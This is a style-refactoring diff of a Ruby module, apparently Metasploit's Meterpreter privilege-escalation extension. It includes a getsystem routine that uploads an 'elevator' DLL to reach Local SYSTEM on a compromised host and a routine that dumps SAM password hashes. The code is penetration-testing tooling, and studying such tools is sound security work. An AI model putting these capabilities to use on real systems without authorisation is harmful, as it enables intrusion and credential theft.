@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/extensions/priv/tlv'
@@ -5,106 +6,106 @@ require 'rex/post/meterpreter/extensions/priv/passwd'
 require 'rex/post/meterpreter/extensions/priv/fs'
 
 module Rex
-module Post
-module Meterpreter
-module Extensions
-module Priv
+  module Post
+    module Meterpreter
+      module Extensions
+        module Priv
+          ###
+          #
+          # This meterpreter extensions a privilege escalation interface that is capable
+          # of doing things like dumping password hashes and performing local
+          # exploitation.
+          #
+          ###
+          class Priv < Extension
+            #
+            # Initializes the privilege escalationextension.
+            #
+            def initialize(client)
+              super(client, 'priv')
 
-###
-#
-# This meterpreter extensions a privilege escalation interface that is capable
-# of doing things like dumping password hashes and performing local
-# exploitation.
-#
-###
-class Priv < Extension
+              client.register_extension_aliases(
+                [
+                  {
+                    'name' => 'priv',
+                    'ext'  => self
+                  }
+                ]
+              )
 
-  #
-  # Initializes the privilege escalationextension.
-  #
-  def initialize(client)
-    super(client, 'priv')
+              # Initialize sub-classes
+              self.fs = Fs.new(client)
+            end
 
-    client.register_extension_aliases(
-      [
-        {
-          'name' => 'priv',
-          'ext'  => self
-        },
-      ])
+            #
+            # Attempt to elevate the meterpreter to Local SYSTEM
+            #
+            def getsystem(technique = 0)
+              request = Packet.create_request('priv_elevate_getsystem')
 
-    # Initialize sub-classes
-    self.fs = Fs.new(client)
-  end
+              elevator_name = Rex::Text.rand_text_alpha_lower(6)
 
-  #
-  # Attempt to elevate the meterpreter to Local SYSTEM
-  #
-  def getsystem( technique=0 )
-    request = Packet.create_request( 'priv_elevate_getsystem' )
+              elevator_path = MetasploitPayloads.meterpreter_path('elevator', client.binary_suffix)
+              if elevator_path.nil?
+                raise RuntimeError, "elevator.#{binary_suffix} not found", caller
+              end
 
-    elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
+              elevator_data = ""
 
-    elevator_path = MetasploitPayloads.meterpreter_path('elevator', client.binary_suffix)
-    if elevator_path.nil?
-      raise RuntimeError, "elevator.#{binary_suffix} not found", caller
-    end
+              ::File.open(elevator_path, "rb") do |f|
+                elevator_data += f.read(f.stat.size)
+              end
 
-    elevator_data = ""
+              request.add_tlv(TLV_TYPE_ELEVATE_TECHNIQUE, technique)
+              request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name)
+              request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data)
+              request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length)
 
-    ::File.open( elevator_path, "rb" ) { |f|
-      elevator_data += f.read( f.stat.size )
-    }
+              # as some service routines can be slow we bump up the timeout to 90 seconds
+              response = client.send_request(request, 90)
 
-    request.add_tlv( TLV_TYPE_ELEVATE_TECHNIQUE, technique )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
+              technique = response.get_tlv_value(TLV_TYPE_ELEVATE_TECHNIQUE)
 
-    # as some service routines can be slow we bump up the timeout to 90 seconds
-    response = client.send_request( request, 90 )
+              if (response.result == 0) && !technique.nil?
+                client.core.use("stdapi") unless client.ext.aliases.include?("stdapi")
+                client.sys.config.getprivs
+                if client.framework.db && client.framework.db.active
+                  begin
+                    client.framework.db.report_note(
+                      host: client.sock.peerhost,
+                      workspace: client.framework.db.workspace,
+                      type: "meterpreter.getsystem",
+                      data: { technique: technique }
+                    )
+                  rescue
+                    nil
+                  end
+                end
+                return [ true, technique ]
+              end
 
-    technique = response.get_tlv_value( TLV_TYPE_ELEVATE_TECHNIQUE )
+              [ false, 0 ]
+            end
 
-    if( response.result == 0 and technique != nil )
-      client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
-      client.sys.config.getprivs
-      if client.framework.db and client.framework.db.active
-        client.framework.db.report_note(
-          :host => client.sock.peerhost,
-          :workspace => client.framework.db.workspace,
-          :type => "meterpreter.getsystem",
-          :data => {:technique => technique}
-        ) rescue nil
-      end
-      return [ true, technique ]
-    end
+            #
+            # Returns an array of SAM hashes from the remote machine.
+            #
+            def sam_hashes
+              # This can take a long long time for large domain controls, bump the timeout to one hour
+              response = client.send_request(Packet.create_request('priv_passwd_get_sam_hashes'), 3600)
 
-    return [ false, 0 ]
-  end
+              response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map do |hash|
+                SamUser.new(hash)
+              end
+            end
 
-  #
-  # Returns an array of SAM hashes from the remote machine.
-  #
-  def sam_hashes
-    # This can take a long long time for large domain controls, bump the timeout to one hour
-    response = client.send_request(Packet.create_request('priv_passwd_get_sam_hashes'), 3600)
+            #
+            # Modifying privileged file system attributes.
+            #
+            attr_reader :fs
 
-    response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
-      SamUser.new(hash)
-    }
-  end
+            protected
 
-  #
-  # Modifying privileged file system attributes.
-  #
-  attr_reader :fs
-
-protected
-
-  attr_writer :fs # :nodoc:
-
-end
-
-end; end; end; end; end
-
+            attr_writer :fs # :nodoc:
+          end
+        end; end; end; end; end
